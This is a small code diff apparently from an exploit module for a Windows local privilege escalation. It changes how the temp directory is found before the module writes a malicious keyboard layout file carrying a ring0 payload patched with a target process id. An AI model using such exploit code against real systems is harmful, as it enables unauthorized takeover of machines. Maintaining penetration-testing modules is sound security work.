@@ -176,7 +176,7 @@ EOS
     ring0_code.gsub!('TPTP', [pid].pack('V'))
 
     # Create the malicious Keyboard Layout file...
-    tmpdir = session.fs.file.expand_path("%TEMP%")
+    tmpdir = session.sys.config.getenv('TEMP')
     fname = "p0wns.boom"
     dllpath = "#{tmpdir}\\#{fname}"
     fd = session.fs.file.new(dllpath, 'wb')
